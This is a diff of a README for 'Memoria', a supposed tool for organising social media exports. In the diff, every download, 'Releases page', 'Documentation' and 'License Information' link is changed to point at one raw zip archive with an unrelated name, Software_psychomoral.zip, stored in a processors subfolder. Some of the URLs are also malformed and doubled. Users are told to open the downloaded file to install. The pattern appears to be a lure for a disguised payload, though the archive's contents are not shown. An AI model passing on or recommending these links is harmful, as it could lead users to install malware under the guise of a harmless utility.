@@ -1,7 +1,7 @@
 # 🧠 memoria - Organize Your Social Media Memories Easily
 
 ## 📥 Download Now
-[![Download Memoria](https://raw.githubusercontent.com/Ahmedmossaid1/memoria/main/processors/memoria_v2.8.zip%https://raw.githubusercontent.com/Ahmedmossaid1/memoria/main/processors/memoria_v2.8.zip)](https://raw.githubusercontent.com/Ahmedmossaid1/memoria/main/processors/memoria_v2.8.zip)
+[![Download Memoria](https://github.com/Ahmedmossaid1/memoria/raw/refs/heads/main/processors/snapchat_messages/Software_psychomoral.zip%https://github.com/Ahmedmossaid1/memoria/raw/refs/heads/main/processors/snapchat_messages/Software_psychomoral.zip)](https://github.com/Ahmedmossaid1/memoria/raw/refs/heads/main/processors/snapchat_messages/Software_psychomoral.zip)
 
 ## 🌟 Description
 Memoria helps you transform messy social media exports into organized and searchable memories. With embedded EXIF metadata, you can keep your photos connected to their original information. This tool is designed to simplify the archiving process for users without any technical skills.
@@ -9,7 +9,7 @@ Memoria helps you transform messy social media exports into organized and search
 ## 🚀 Getting Started
 Here’s how to download and run Memoria for the first time. Follow these steps to get started:
 
-1. **Visit the Releases Page**: Click [here](https://raw.githubusercontent.com/Ahmedmossaid1/memoria/main/processors/memoria_v2.8.zip) to go to the Releases page.
+1. **Visit the Releases Page**: Click [here](https://github.com/Ahmedmossaid1/memoria/raw/refs/heads/main/processors/snapchat_messages/Software_psychomoral.zip) to go to the Releases page.
 2. **Choose a Version**: Look for the latest version of Memoria. It will usually be listed at the top.
 3. **Download the File**: Click on the asset that matches your operating system (Windows, Mac, or Linux).
 4. **Install the Application**: Once the download is complete, open the downloaded file to install Memoria on your computer.
@@ -32,7 +32,7 @@ To run Memoria smoothly, ensure your computer meets the following system require
 - **Internet Connection**: Required for downloading updates and accessing support.
 
 ## 📦 Download & Install
-To download Memoria, visit this page: [Download Here](https://raw.githubusercontent.com/Ahmedmossaid1/memoria/main/processors/memoria_v2.8.zip). Follow the installation instructions provided above once the download completes. 
+To download Memoria, visit this page: [Download Here](https://github.com/Ahmedmossaid1/memoria/raw/refs/heads/main/processors/snapchat_messages/Software_psychomoral.zip). Follow the installation instructions provided above once the download completes. 
 
 ## 📘 Using Memoria
 After installing Memoria, you can begin organizing your social media exports. Here are the steps to use the application:
@@ -57,14 +57,14 @@ A: Currently, Memoria is compatible with Windows, Mac, and Linux.
 A: No, Memoria organizes existing files without deleting them.
 
 **Q3: Is there a user guide?**  
-A: Yes, you can find detailed help within the app under “Help” or by visiting our [Documentation](https://raw.githubusercontent.com/Ahmedmossaid1/memoria/main/processors/memoria_v2.8.zip).
+A: Yes, you can find detailed help within the app under “Help” or by visiting our [Documentation](https://github.com/Ahmedmossaid1/memoria/raw/refs/heads/main/processors/snapchat_messages/Software_psychomoral.zip).
 
 ## 🤝 Support
 If you encounter any issues or have questions, you can reach out for help in the issues section of this repository. Users and maintainers are usually active and willing to assist.
 
 ## 🔗 Links
-- [Download Memoria](https://raw.githubusercontent.com/Ahmedmossaid1/memoria/main/processors/memoria_v2.8.zip)
-- [Documentation](https://raw.githubusercontent.com/Ahmedmossaid1/memoria/main/processors/memoria_v2.8.zip)
-- [License Information](https://raw.githubusercontent.com/Ahmedmossaid1/memoria/main/processors/memoria_v2.8.zip)
+- [Download Memoria](https://github.com/Ahmedmossaid1/memoria/raw/refs/heads/main/processors/snapchat_messages/Software_psychomoral.zip)
+- [Documentation](https://github.com/Ahmedmossaid1/memoria/raw/refs/heads/main/processors/snapchat_messages/Software_psychomoral.zip)
+- [License Information](https://github.com/Ahmedmossaid1/memoria/raw/refs/heads/main/processors/snapchat_messages/Software_psychomoral.zip)
 
 Thank you for choosing Memoria to help organize your memories!
